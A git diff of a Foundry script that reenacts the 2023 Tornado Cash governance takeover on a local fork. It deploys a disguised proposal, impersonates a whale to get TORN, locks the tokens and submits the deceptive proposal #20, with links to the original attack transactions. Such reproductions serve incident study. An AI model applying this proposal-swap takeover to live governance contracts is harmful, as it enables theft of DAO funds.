@@ -1,4 +1,19 @@
 // SPDX-License-Identifier: MIT
+
+// ============================= POTENTIALLY DEPRECATED =============================
+
+// ============================= POTENTIALLY DEPRECATED =============================
+
+// ============================= POTENTIALLY DEPRECATED =============================
+
+// ============================= POTENTIALLY DEPRECATED =============================
+
+// ============================= POTENTIALLY DEPRECATED =============================
+
+// ============================= POTENTIALLY DEPRECATED =============================
+
+// ============================= POTENTIALLY DEPRECATED =============================
+
 pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
@@ -14,6 +29,7 @@ import {Ownable} from "./AttackerOwnable.sol";
 import "./TornadoGovernance.interface.sol";
 
 contract Exploit_TornadoCashGovernanceS is Script, TestHarness {
+    ITornadoGovernance TORNADO_GOVERNANCE = ITornadoGovernance(0x5efda50f22d34F262c29268506C5Fa42cB56A1Ce);
     IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);
 
     uint256 ATT1_Key = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
@@ -23,31 +39,43 @@ contract Exploit_TornadoCashGovernanceS is Script, TestHarness {
     address ATTACKER2 = vm.rememberKey(ATT2_Key);
 
     address whale = 0xF977814e90dA44bFA03b6295A0616a897441aceC;
+    address someacc = 0xF977814e90Da44bFa03B6295a0616a897441aCeD;
 
     ReinitializableContractFactory proposalFactory;
     TransientContract transientContract;
     Proposal_20 proposal_20;
 
-    function setUp() public {
-        // cheat.createSelectFork("mainnet", 17_248_593); // The block where the step 0. happens.
-
-        // The attacker used two accounts
-        // cheat.deal(ATTACKER1, 0.5 ether);
-        // cheat.deal(ATTACKER2, 0.5 ether);
-
-        //  This contract would play the role of the Attacker Contract
-        // cheat.deal(address(this), 0.5 ether);
-    }
-
     function run() external {
+        anvil_auto_impersonate();
+
         console2.log("\n======== STEP 0. DEPLOY FACTORY AND PROPOSAL ========");
         // 0. Deploy a Factory with the transient and a "benign" proposal with the Attacker 2
         // https://explorer.phalcon.xyz/tx/eth/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a?line=0&debugLine=0
         vm.startBroadcast(ATTACKER2);
-        // _deployFactoryAndProposal();
-        // _initialTornLock();
+        _deployFactoryAndProposal();
+        vm.stopBroadcast();
+
+        // Get Torn from a Whale
         _swapEthForTorn();
 
+        // Lock in Tornado
+        vm.startBroadcast(ATTACKER2);
+        _initialTornLock();
+        vm.stopBroadcast();
+
+        console2.log("\n======== STEP 1. SUBMIT MALICIOUS PROPOSAL ========");
+        // 1. Submit the proposal #20 allegating some relayers are cheating the protocol with the
+        // Attacker 2
+        // https://explorer.phalcon.xyz/tx/eth/0x34605f1d6463a48b818157f7b26d040f8dd329273702a0618e9e74fe350e6e0d?line=0&debugLine=0
+        anvil_mine_up_to(17_249_552);
+        vm.roll(17_249_552);
+
+        console2.log("Submitting proposal...");
+        vm.startBroadcast(ATTACKER2);
+        TORNADO_GOVERNANCE.propose(
+            address(proposal_20),
+            '{"title":"Proposal #20: Relayer registry penalization","description":"Penalize following relayers who is cheating the protocol.\nThe staked balances of these relayers are not burned at all, so the staking reward of valid participants are not properly paid.\n\n0xcBD78860218160F4b463612f30806807Fe6E804C tornadope.eth\n0x94596B6A626392F5D972D6CC4D929a42c2f0008c 0xgm777.eth\n0x065f2A0eF62878e8951af3c387E4ddC944f1B8F4 0xtorn365.eth\n0x18F516dD6D5F46b2875Fd822B994081274be2a8b abc321.eth\n\nUse same logic of proposal #16."}'
+        );
         vm.stopBroadcast();
 
         console2.log("\n======== STEP 3. DESTROY THE PROPOSAL AND TRANSIENT ========");
@@ -72,9 +100,10 @@ contract Exploit_TornadoCashGovernanceS is Script, TestHarness {
         // We emulate the swap with a token transfer from a Whale (getting 1017 TORN)
         // Swap 1 https://etherscan.io/tx/0x82dca5a88a43377cab4748073a3a46c8aa120d42c5c5d802789cf17df22f0acd
         // Swap 2 https://etherscan.io/tx/0x6d3445d633de3d9c9dfdd4ca75cab9ff2cd269ec6d124baf2cd11cd177d04850
-        anvil_impersonate_whale();
-        vm.prank(whale);
+
+        vm.startBroadcast(whale);
         tornToken.transfer(ATTACKER2, 1017 ether);
+        vm.stopBroadcast();
         anvil_stop_impersonation();
 
         assertEq(tornToken.balanceOf(ATTACKER2), 1017 ether, "torn token balance mismatch");
@@ -102,6 +131,14 @@ contract Exploit_TornadoCashGovernanceS is Script, TestHarness {
 
         console2.log("Transient deployed at: %s", address(transientContract));
         console2.log("Proposal 20 deployed at: %s", address(proposal_20));
+    }
+
+    function _initialTornLock() internal {
+        // The attacker first approves with type(uint256).max
+        tornToken.approve(address(TORNADO_GOVERNANCE), type(uint256).max);
+
+        // Then locks with approval
+        TORNADO_GOVERNANCE.lockWithApproval(tornToken.balanceOf(ATTACKER2));
     }
 
     function _redeployTransientAndProposal() internal {
